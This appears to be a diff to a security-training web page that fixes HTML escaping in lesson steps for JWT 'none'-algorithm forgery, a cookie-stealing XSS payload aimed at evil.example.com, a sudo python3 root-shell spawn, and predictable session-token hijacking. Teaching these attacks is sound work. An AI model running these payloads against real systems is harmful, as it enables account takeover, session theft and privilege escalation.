@@ -174,14 +174,10 @@
     <p class="desc">JWT has 3 parts: header.payload.signature. If server accepts 'none' algorithm, you can forge tokens.</p>
     <div class="step-label">Steps</div>
     <ol class="step-list"><li>1. JWT: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiZ3Vlc3QifQ.</li>
-<li>2. Decode header: {\</li>
-<li>:\</li>
-<li>} \u2014 no signature needed!</li>
-<li>3. Change payload to: {\</li>
-<li>:\</li>
-<li>}</li>
+<li>2. Decode header: {&quot;alg&quot;:&quot;none&quot;,&quot;typ&quot;:&quot;JWT&quot;} &mdash; no signature needed!</li>
+<li>3. Change payload to: {&quot;username&quot;:&quot;admin&quot;,&quot;role&quot;:&quot;admin&quot;}</li>
 <li>4. Encode back: header.payload. (empty signature)</li>
-<li>5. Send \u2014 you get admin access!</li></ol>
+<li>5. Send &mdash; you get admin access!</li></ol>
     
   </div>
 </div>
@@ -292,9 +288,9 @@
     <p class="desc">A website reflects user input without sanitizing. You can inject JavaScript that runs in other users' browsers.</p>
     <div class="step-label">Steps</div>
     <ol class="step-list"><li>1. Find an input field (comment box, search bar)</li>
-<li>2. Try: <script>alert('XSS')</script></li>
-<li>3. Submit \u2014 if it executes, site is vulnerable</li>
-<li>4. Real attack: <script>document.location='https://attacker.com/steal?c='+document.cookie</script></li>
+<li>2. Try: &lt;script&gt;alert('XSS')&lt;/script&gt;</li>
+<li>3. Submit &mdash; if it executes, site is vulnerable</li>
+<li>4. Real attack payload: &lt;script&gt;document.location='https://evil.example.com/steal?c='+document.cookie&lt;/script&gt;</li>
 <li>5. You just stole every user's session cookie!</li></ol>
     
   </div>
@@ -316,11 +312,9 @@
     <div class="step-label">Steps</div>
     <ol class="step-list"><li>1. Check sudo permissions: sudo -l</li>
 <li>2. Find: (ALL : ALL) NOPASSWD: /usr/bin/python3</li>
-<li>3. Spawn root shell: sudo python3 -c \</li>
-<li>,
-        </li>
-<li>,
-        </li></ol>
+<li>3. Spawn root shell: sudo python3 -c "import pty; pty.spawn(['/bin/bash'])"</li>
+<li>4. You now have a root shell!</li>
+<li>5. Mitigatie: nooit NOPASSWD voor interpreter in /etc/sudoers</li></ol>
     
   </div>
 </div>
@@ -478,7 +472,8 @@
     <p class="desc">Session tokens are predictable (sequential, timestamp-based, or time-based). Predict the token and hijack sessions.</p>
     <div class="step-label">Steps</div>
     <ol class="step-list"><li>1. Log in twice, get two tokens: session1=abc123, session2=abc456</li>
-<li>3. Pattern: sequential numbers \u2192 predict next token: abc789</li>
+<li>2. Notice the pattern &mdash; sequential numbers</li>
+<li>3. Predict next token: abc789</li>
 <li>4. Send request with Cookie: session=abc789</li>
 <li>5. You're logged in as the next user!</li></ol>
     
